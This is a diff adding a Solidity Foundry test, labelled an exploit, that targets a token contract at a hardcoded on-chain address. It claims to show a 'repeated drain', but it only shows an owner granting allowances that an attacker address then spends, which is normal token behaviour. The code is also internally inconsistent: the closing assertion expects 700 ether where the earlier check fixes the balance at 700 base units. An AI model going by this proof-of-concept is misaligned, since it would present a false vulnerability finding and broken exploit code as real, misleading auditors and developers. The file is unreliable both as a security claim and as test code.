@@ -1,0 +1,95 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+interface ITouch {
+    function name() external view returns (string memory);
+    function symbol() external view returns (string memory);
+    function decimals() external view returns (uint8);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address _owner) external view returns (uint256);
+    function transfer(address _to, uint256 _value) external returns (bool);
+    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);
+    function approve(address _spender, uint256 _value) external returns (bool);
+    function allowance(address _owner, address _spender) external view returns (uint256);
+    function increaseApproval(address _spender, uint256 _addedValue) external returns (bool);
+    function decreaseApproval(address _spender, uint256 _subtractedValue) external returns (bool);
+    function moderator() external view returns (address);
+    function unrestricted() external view returns (bool);
+    function maximumTokenIssue() external view returns (uint256);
+    function restrict() external;
+    function unrestrict() external;
+    function reassignModerator(address newModerator) external;
+    function extract(address _token) external returns (bool);
+}
+
+contract ExploitTest is Test {
+    ITouch constant touch = ITouch(0x5e0af01930c8dc676a6dc7133bd86370a0be3953);
+    address owner;
+    address attacker;
+    uint256 constant INITIAL_SUPPLY = 1_000_000_000 * 1e18;
+    uint256 constant SMALL_APPROVE = 100;
+
+    function setUp() public {
+        // Get the moderator (owner of all tokens)
+        owner = touch.moderator();
+        vm.label(owner, "Owner");
+        attacker = address(0xb0b);
+        vm.label(attacker, "Attacker");
+
+        // Confirm initial state
+        assertEq(touch.balanceOf(owner), INITIAL_SUPPLY);
+        assertEq(touch.totalSupply(), INITIAL_SUPPLY);
+        assertTrue(touch.unrestricted()); // transfers enabled
+    }
+
+    function testExploit_RepeatedDrainViaIncreaseApproval() public {
+        // Step 1: Owner approves attacker for a small amount (100 tokens)
+        vm.prank(owner);
+        touch.approve(attacker, SMALL_APPROVE);
+        assertEq(touch.allowance(owner, attacker), SMALL_APPROVE);
+
+        // Step 2: Owner increases approval by the same amount (allowance becomes 200)
+        vm.prank(owner);
+        touch.increaseApproval(attacker, SMALL_APPROVE);
+        assertEq(touch.allowance(owner, attacker), SMALL_APPROVE * 2);
+
+        // Step 3: Attacker transfers the doubled allowance (200 tokens)
+        vm.prank(attacker);
+        bool success = touch.transferFrom(owner, attacker, SMALL_APPROVE * 2);
+        assertTrue(success);
+
+        // Check balances after first drain
+        assertEq(touch.balanceOf(owner), INITIAL_SUPPLY - SMALL_APPROVE * 2);
+        assertEq(touch.balanceOf(attacker), SMALL_APPROVE * 2);
+        assertEq(touch.allowance(owner, attacker), 0);
+
+        // Step 4: Repeat loop 5 times – each time owner increases approval again,
+        // then attacker drains the new allowance immediately.
+        // This simulates the "repeatedly calling them in a loop" exploitation.
+        uint256 drainPerIteration = SMALL_APPROVE; // owner can add more if desired
+        for (uint256 i = 0; i < 5; i++) {
+            // Owner increases approval by drainPerIteration (allowance becomes exactly drainPerIteration)
+            vm.prank(owner);
+            touch.increaseApproval(attacker, drainPerIteration);
+            assertEq(touch.allowance(owner, attacker), drainPerIteration);
+
+            // Attacker drains the allowance
+            vm.prank(attacker);
+            success = touch.transferFrom(owner, attacker, drainPerIteration);
+            assertTrue(success);
+            assertEq(touch.allowance(owner, attacker), 0);
+        }
+
+        // Total drained: first double drain (200) + 5 * 100 = 700 tokens
+        uint256 totalDrained = SMALL_APPROVE * 2 + 5 * SMALL_APPROVE; // 700
+        assertEq(touch.balanceOf(attacker), totalDrained);
+        assertEq(touch.balanceOf(owner), INITIAL_SUPPLY - totalDrained);
+
+        // Final assertion: attacker has drained 700 tokens from owner
+        assertGe(touch.balanceOf(attacker), 700 ether);
+    }
+}
+```
